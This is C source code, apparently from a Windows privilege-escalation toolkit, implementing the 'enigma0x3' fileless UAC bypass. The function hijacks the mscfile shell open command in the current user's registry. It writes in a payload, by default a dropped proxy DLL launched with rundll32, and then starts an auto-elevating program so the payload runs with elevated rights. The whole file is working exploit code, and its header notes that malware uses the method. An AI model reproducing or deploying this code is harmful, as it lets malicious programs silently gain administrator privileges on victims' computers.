/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2017
*
*  TITLE:       ENIGMA0X3.C
*
*  VERSION:     2.53
*
*  DATE:        18 Jan 2017
*
*  Enigma0x3 autoelevation method.
*  Used by unnamed MSIL malware.
*
*  For description please visit original URL
*  https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmHijackShellCommandMethod
*
* Purpose:
*
* Overwrite Default value of mscfile shell command with your payload.
*
*/
BOOL ucmHijackShellCommandMethod(
    _In_opt_ LPWSTR lpszPayload,
    _In_ LPWSTR lpszTargetApp
    )
{
    BOOL    bCond = FALSE, bResult = FALSE;
    HKEY    hKey = NULL;
    LRESULT lResult;
    LPWSTR  lpBuffer = NULL;
    SIZE_T  sz;
    WCHAR   szBuffer[MAX_PATH * 2];

    if (lpszTargetApp == NULL)
        return FALSE;
    
    do {

        sz = 0;
        if (lpszPayload == NULL) {
            sz = 0x1000;
        }
        else {
            sz = _strlen(lpszPayload);
        }
        lpBuffer = RtlAllocateHeap(g_ctx.Peb->ProcessHeap, HEAP_ZERO_MEMORY, sz);
        if (lpBuffer == NULL)
            break;

        if (lpszPayload != NULL) {
            _strcpy(lpBuffer, lpszPayload);
        }
        else {
            //no payload specified, use default fubuki, drop dll first as wdscore.dll to %temp%
            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
            _strcpy(szBuffer, g_ctx.szTempDirectory);
            _strcat(szBuffer, WDSCORE_DLL);
            //write proxy dll to disk
            if (!supWriteBufferToFile(szBuffer, g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
                break;
            }

            //now rundll it
            _strcpy(lpBuffer, L"rundll32.exe ");
            _strcat(lpBuffer, szBuffer);
            _strcat(lpBuffer, L",WdsInitialize");
        }

        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, 
            L"Software\\Classes\\mscfile\\shell\\open\\command", 0, NULL, REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);

        if (lResult != ERROR_SUCCESS)
            break;

        lResult = RegSetValueEx(hKey, L"", 0, REG_SZ, (BYTE*)lpBuffer,
            (DWORD)(_strlen(lpBuffer) * sizeof(WCHAR)));

        if (lResult != ERROR_SUCCESS)
            break;

        bResult = supRunProcess(lpszTargetApp, NULL);

    } while (bCond);

    if (lpBuffer != NULL)
        RtlFreeHeap(g_ctx.Peb->ProcessHeap, 0, lpBuffer);

    if (hKey != NULL)
        RegCloseKey(hKey);

    return bResult;
}
